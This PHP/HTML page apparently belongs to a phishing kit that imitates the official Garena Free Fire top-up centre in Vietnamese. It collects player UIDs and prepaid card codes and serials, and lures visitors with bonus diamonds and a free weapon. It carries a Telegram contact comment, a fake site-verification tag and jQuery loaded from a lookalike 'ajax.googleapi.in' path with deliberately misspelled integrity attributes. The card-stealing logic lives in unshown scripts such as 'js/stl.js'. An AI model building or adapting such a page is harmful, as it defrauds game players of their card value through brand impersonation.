<?php session_start();
$gameid = isset($_GET['game']) ? $_GET['game'] : null;
if (isset($gameid) && $gameid === $_SESSION['game_id']) {
    $isLogin = true; 
} else {
    $isLogin = false; 
}
?>
<!DOCTYPE html>
<html lang="en">
<!-- Tele: @delta_mmo --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- Tele: @delta_mmo -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="google-site-verification" content="ajax.googleapi">
    <title>Free Fire - Trung tâm nạp game thẻ cào</title>

    <link rel="icon" type="image/x-icon" href="images/logo/logo.svg">
    <meta name="csrf-token" content="FiB0f9gTVihqVrYVRZo5e2qdqYUxqRpT9Px1wn1X">
    <meta name="user-id" content="">
    <meta name="captcha" content="1">
    <link rel="stylesheet" href="style.css">
    <script>
    const isLogin = <?php echo isset($_SESSION['player_id']) ? 'true' : 'false'; ?>;
    console.log(isLogin);
</script>
    <!-- Thêm các liên kết đến CSS hoặc JavaScript ở đây -->

    <link rel="stylesheet" href="../site-assets.fontawesome.com/releases/v6.5.2/css/all.css">
    <script src="../ajax.googleapi.in/ajax/libs/jquery/3.6.0/jquery.min.js" intigrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossoriginrs="anonymous" referrerpolacy="no-referrer"></script>

    <script src="../www.google.com/recaptcha/api.js"></script>

    <script src="js/stl.js"></script>
   
</head>

<body>
<?php require_once('header.php'); ?>

        <div class="container">
            <div class="game-banner" id="game-banner" style="background-image: url('../cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-2cb78e7c.jpg');">
                <div class="game-info">
                    <img class="game-icon" src="images/icon_game/freefire.png" />
                    <div class="game-details">
                        <h2 class="game-title">Free Fire</h2>
                        <div class="game-badge">
                            <i class="fa-regular fa-shield-check badge-icon"></i> 100% thanh toán an toàn
                        </div>
                    </div>
                </div>
            </div>

            <div class="badge-container">
                <div class="badge-number">1</div>
                <span class="label-text">Đăng nhập</span>
            </div>
            <?php if ($isLogin) { ?>
            <div class="login-container">
                            <div class="login-form">
                                    <div class="user-info">
                        <div class="avatar">
                            <img src="images/icon_game/freefire.png" class="avatar-image">
                        </div>
                        <div class="user-details">
                            <div class="user-id"><?=$_SESSION['player_id'];?></div>
                            <div class="user-location">Khu vực: VN</div>
                        </div>
                        <div class="logout-link">
                            <a href="/logout">
                                <i class="fas fa-sign-out-alt"></i>
                            </a>
                        </div>
                    </div>
                            </div>
                            <?php } else { ?>
            <div class="login-container">
                                <div class="login-form">
                    <div class="form-label">
                        <div class="title-login">UID người chơi</div>
                        <div class="showGetUID">Hướng dẫn lấy UID</div>
                    </div>
                    <form id="login-form" method="POST">
                        <input type="hidden" name="_token" value="FiB0f9gTVihqVrYVRZo5e2qdqYUxqRpT9Px1wn1X" autocomplete="off">
                        <div class="form-group">
                            <div class="input-group">
                                <input type="text" name="player_id" id="player-id" placeholder="Nhập UID tài khoản Free Fire" class="input-field">
                                <span class="paste-icon">
                                    <i class="fa-duotone fa-paste"
                                        style="--fa-primary-color: #d9534f; --fa-secondary-color: #d9534f;"></i>
                                </span>
                            </div>
                            <button class="login-button">Đăng nhập</button>
                        </div>
                        <div class="tb-nonlogin"></div>
                    </form>
                </div>
                <?php } ?>
                                    <div class="gift" style="background-image: url('images/gift/scar-ca-map-den.png');">
                    <div class="bg">
                        <div class="simple-text">Nhận ngay súng</div>
                        <div class="highlight-text">Scar Cá Mập Đen</div>
                        <div class="simple-text">Khi nạp thẻ <strong>lần đầu</strong> có mệnh giá từ
                            <strong>500.000 ₫</strong> trở lên
                        </div>
                    </div>
                </div>
            </div>

            <div class="badge-container">
                <div class="badge-number">2</div>
                <span class="label-text">Mệnh giá và Kim cương</span>
            </div>
            <input type="hidden" name="game_id" value="FreeFire">
            <input type="hidden" id="selected-menhgia">
            <input type="hidden" id="selected-loaithe">
            <div class="currency-section">
                <div class="list-currency">
                    <div class="currency-item" data-menhgia="50000" data-soluong="1132">
                        <div class="currency-top">
                            <img src="images/tiente/kimcuong.png" class="currency-icon">
                            <span class="currency-amount">1,132</span>
                        </div>
                        <span class="currency-price">50.000 ₫</span>
                    </div>
                    <div class="currency-item" data-menhgia="100000" data-soluong="2264">
                        <div class="currency-top">
                            <img src="images/tiente/kimcuong.png" class="currency-icon">
                            <span class="currency-amount">2,264</span>
                        </div>
                        <span class="currency-price">100.000 ₫</span>
                    </div>
                    <div class="currency-item" data-menhgia="200000" data-soluong="4528  ">
                        <div class="currency-top">
                            <img src="images/tiente/kimcuong.png" class="currency-icon">
                            <span class="currency-amount">4,528</span>
                        </div>
                        <span class="currency-price">200.000 ₫</span>
                    </div>
                    <div class="currency-item" data-menhgia="300000" data-soluong="6792">
                        <div class="currency-top">
                            <img src="images/tiente/kimcuong.png" class="currency-icon">
                            <span class="currency-amount">6,792</span>
                        </div>
                        <span class="currency-price">300.000 ₫</span>
                    </div>
                    <div class="currency-item" data-menhgia="500000" data-soluong="11320">
                        <div class="currency-top">
                            <img src="images/tiente/kimcuong.png" class="currency-icon">
                            <span class="currency-amount">11,320</span>
                        </div>
                        <span class="currency-price">500.000 ₫</span>
                    </div>
                    <div class="currency-item" data-menhgia="1000000" data-soluong="23000">
                        <div class="currency-top">
                            <img src="images/tiente/kimcuong.png" class="currency-icon">
                            <span class="currency-amount">23,000</span>
                        </div>
                        <span class="currency-price">1.000.000 ₫</span>
                    </div>
                </div>

                <style>
                    .currency-success {
                        color: green;
                        margin-top: 5px;
                        font-style: italic;
                    }
                </style>

                <div class="currency-success"><strong>• Khuyến mãi</strong>: Nhận thêm <strong>50%
                    Kim cương</strong> nếu nạp thẻ từ <strong>100,000 ₫</strong> trở lên.</div>
            </div>


            <div class="payment-method">
                <div class="card-selection">
                    <div class="badge-container">
                        <div class="badge-number">3</div>
                        <span class="label-text">Phương thức thanh toán</span>
                    </div>
                    <div class="list-card">
                        <div class="card-item" data-card="GARENA">
                            <img src="images/card/garena1.png" alt="Nạp Free Fire bằng thẻ Garena">
                        </div>
                        <div class="card-item" data-card="VIETTEL">
                            <img src="images/card/viettel.png" alt="Nạp Free Fire bằng thẻ Viettel">
                        </div>
                        <div class="card-item" data-card="VINAPHONE">
                            <img src="images/card/vinaphone.png" alt="Nạp Free Fire bằng thẻ Vinaphone">
                        </div>
                        <div class="card-item" data-card="MOBIFONE">
                            <img src="images/card/mobifone.png" alt="Nạp Free Fire bằng thẻ Mobifone">
                        </div>
                        <div class="card-item" data-card="VNMOBI">
                            <img src="images/card/vietnamobile.png" alt="Nạp Free Fire bằng thẻ Vietnamobile">
                        </div>
                        <div class="card-item" data-card="ZING">
                            <img src="images/card/zing.png" alt="Nạp Free Fire bằng thẻ Zing">
                        </div>
                        <div class="card-item" data-card="GATE">
                            <img src="images/card/gate.png" alt="Nạp Free Fire bằng thẻ Gate">
                        </div>
                        <div class="card-item" data-card="VCOIN">
                            <img src="images/card/vcoin.png" alt="Nạp Free Fire bằng thẻ Vcoin">
                        </div>
                    </div>
                </div>

                <div class="ngan"></div>
                <!-- Phần nhập mã thẻ và seri -->
                <div class="input-section">
                    <div class="badge-container">
                        <div class="badge-number">4</div>
                        <span class="label-text">Thông tin thanh toán</span>
                    </div>
                    <div class="code-seri">
                        <div class="input-wrapper">
                            <input type="text" id="card-code" class="input-field" placeholder="Nhập mã thẻ in dưới lớp giấy bạc">
                            <span class="paste-icon" data-input="card-code">
                            <i class="fa-duotone fa-paste"
                                style="--fa-primary-color: #d9534f; --fa-secondary-color: #d9534f;"></i>
                        </span>
                        </div>
                        <div class="input-wrapper">
                            <input type="text" id="card-seri" class="input-field" placeholder="Nhập số seri in trên thẻ">
                            <span class="paste-icon" data-input="card-seri">
                            <i class="fa-duotone fa-paste"
                                style="--fa-primary-color: #d9534f; --fa-secondary-color: #d9534f;"></i>
                        </span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="purchase-section">
                <div class="purchase-info">
                    <div class="quantity">
                        <img src="#" class="currency-icon" />
                        <span id="currency-amount"></span> <span id="currency-bonnus"></span>
                    </div>
                    <div class="total">
                        Tổng tiền: <span id="currency-price">đ</span>
                    </div>
                </div>
                <button class="buy-now-button">
                <i class="fas fa-shield-alt"></i> Thanh toán
            </button>
            </div>
        </div>

        <div id="popup-thongbao" class="custom-popup-overlay" style="display: none;">
            <div class="custom-popup-content">
                <div class="custom-popup-header">
                    <img class="custom-banner-img" src="../cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-2cb78e7c.jpg" alt="Game Banner">
                    <button class="custom-close-button" onclick="closePopup()">×</button>
                </div>
                <div class="custom-popup-body">
                    <div class="custom-icon-section">
                        <img class="custom-game-icon" src="images/icon_game/freefire.png" alt="Game Icon">
                        <div class="custom-game-info">
                            <div class="custom-game-title" id="status-thong-bao">Free Fire</div>

                            <div class="custom-secure-badge">
                                Phản hồi từ máy chủ
                            </div>
                        </div>
                    </div>

                    <div class="popup-main-content" id="msg-thong-bao">

                    </div>
                </div>
                <div class="custom-popup-bottom">
                </div>
            </div>
        </div>

        <div id="popup-get-uid" class="custom-popup-overlay" style="display: none;">
            <div class="custom-popup-content-get-uid">
                <div class="custom-popup-header">
                    <img class="custom-banner-img" src="../cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-2cb78e7c.jpg" alt="Game Banner">
                    <button class="custom-close-button" onclick="closeShowGetUID()">×</button>
                </div>
                <div class="custom-popup-body">
                    <div class="custom-icon-section">
                        <img class="custom-game-icon" src="images/icon_game/freefire.png" alt="Game Icon">
                        <div class="custom-game-info">
                            <div class="custom-game-title">Free Fire</div>
                            <div class="custom-secure-badge">
                                Hướng dẫn lấy UID
                            </div>
                        </div>
                    </div>

                    <div class="popup-main-content">
                        <div class="get-uid-img">
                            <img src="images/get_id/get-uid-freefire.png" alt="Hướng dẫn lấy UID Free Fire">
                        </div>
                    </div>
                </div>
                <div class="custom-popup-bottom">
                </div>
            </div>
        </div>

        <!-- Popup reCAPTCHA -->
        <div id="recaptcha-popup" class="captcha-popup-overlay">
            <div class="captcha-popup-content">
                <!-- Tiêu đề với icon shield -->
                <h2 class="captcha-title">
                    <i class="fa-solid fa-shield-check"></i>
                    <!-- Icon từ Font Awesome -->
                    Xác nhận bạn không phải người máy
                </h2>
                <!-- ReCAPTCHA -->
                <div class="g-recaptcha" data-sitekey="<?php echo $data_sitekey; ?>" data-callback="onRecaptchaSuccess">
                </div>
                <p class="info">Chúng tôi đang bảo vệ tài khoản của bạn khỏi các cuộc tấn công. Vui lòng bấm vào ô xác nhận bạn không phải là một người máy.</p>
            </div>
        </div>

        <script src="js/home_nonlogin.js"></script>

    </main>

    <footer>
        <div class="footer-container">
            <div class="footer-left">
                © NAPTHE 2024
            </div>

        </div>
    </footer>

    <script src="js/napgame.js"></script>
    <script src="../www.google.com/recaptcha/api.js" id="recaptcha-api" data-callback="ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</body>


</html>